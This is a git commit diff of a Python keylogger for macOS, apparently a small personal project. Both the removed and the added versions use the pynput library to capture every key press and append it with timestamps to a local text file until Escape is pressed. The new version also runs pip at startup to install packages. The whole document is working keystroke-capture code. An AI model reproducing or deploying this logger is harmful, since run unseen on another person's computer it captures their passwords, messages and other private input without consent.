c2c4baebae23be94e7a79253421b48c7b37d9906
Grant Duvall <grant@mark4tech.com>
2023-06-12 16:40:35 -0500

    fixing

--- keylogger_mac.py
+++ keylogger_mac.py
@@ -1,51 +1,50 @@
-# Keylogger for Mac
-
+import pip
 from pynput import keyboard
 import datetime
 
-def main():
+# Installs packages if missing
+def install(package):
+    if hasattr(pip, 'main'):
+        pip.main(['install', package])
+    else:
+        pip._internal.main(['install', package])
+
+if __name__ == '__main__':
+    install('datetime')
+    install('pynput')
+
+
+
+now = datetime.datetime.now()
+strnow = str(now)
+file1 = open('./myfile.txt', 'a')
+file1.write('\n Staring pylogger \n')
+file1.write(strnow)
+file1.close()
+
+
+
+def on_press(key):
     try:
-        f = open("keylogger.txt", 'a') # defined globaly
-        now = datetime.datetime.now()
-        f.write("\n\nRan at: ")
-        f.write(str(now))
-        f.write("\n")
-        
-            
-        def get_key_name(key):
-            if isinstance(key, keyboard.KeyCode):
-                return key.char 
-            else:
-                return str(key)
-        
-        def on_press(key):
-            key_name = get_key_name(key)
-            print('Key {} pressed.'.format(key_name))
-            f.write(key_name) # writes keys to "keylogger.txt"
-            f.write(" ")
-        
-        # Get keylogger to log special keys
-            
-        
-        def on_release(key):
-            key_name = get_key_name(key)
-            print('Key {} released.'.format(key_name))
-        
-            if key_name == 'Key.esc':
-                print('Exiting...')
-                now1 = datetime.datetime.now()
-                f.write("\nClosed at: ")
-                f.write(str(now1))      
-                f.close() 
-                return False
-            
-        with keyboard.Listener(on_press = on_press,on_release = on_release) as listener:
-            listener.join()
-            
-    except: # Have exception to allow the file to be closed so info can be stored
-        now1 = datetime.datetime.now()
-        f.write("\nClosed at: ")
-        f.write(str(now1))     
-        f.close()
-        
-main()
+        file1 = open('./myfile.txt', 'a')
+        file1.write('\n')
+        file1.write('alphanumeric key {0} pressed'.format(
+            key.char))
+        file1.close()
+
+    except AttributeError:
+        file1 = open('./myfile.txt', 'a')
+        file1.write('special key {0} pressed'.format(
+            key))
+        file1.close()
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
